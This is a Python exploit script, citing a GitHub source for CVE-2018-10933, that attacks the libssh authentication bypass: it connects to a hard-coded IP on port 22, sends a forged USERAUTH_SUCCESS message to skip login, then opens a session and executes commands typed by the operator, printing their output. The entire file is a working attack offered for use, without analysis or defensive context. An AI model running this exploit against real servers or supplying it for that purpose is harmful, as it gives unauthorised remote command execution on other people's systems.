# Source ref: https://github.com/r3dxpl0it/CVE-2018-10933
import socket
import paramiko
import time
# Create socket to connect to port 22 of target server

with socket.socket() as s:
    s.connect(('10.0.9.156', int(22)))
    print('[+] Connected to target!')
    time.sleep(5)

    message = paramiko.message.Message()
    # Create SSH channel
    transport = paramiko.transport.Transport(sock=s)
    transport.start_client()
    print('[+] Opened channel...')
    time.sleep(5)

    # Write Authenticated Success bytes to message
    message.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
    print('[+] Value of USERAUTH_SUCESS:', int(paramiko.common.cMSG_USERAUTH_SUCCESS, 16))
    print('[+] Sending...')
    transport._send_message(message)
    print('[+] Sent payload succesfully.')
    time.sleep(3)

    # Open SSH session
    print('[+] Open seesion to executet remote shell!')
    cmd = transport.open_session()
    time.sleep(5)

    command = input('Enter command: ')
    cmd.exec_command(command)
    out = cmd.makefile('rb', 2048)
    output = out.read()
    out.close()
    print(output.decode())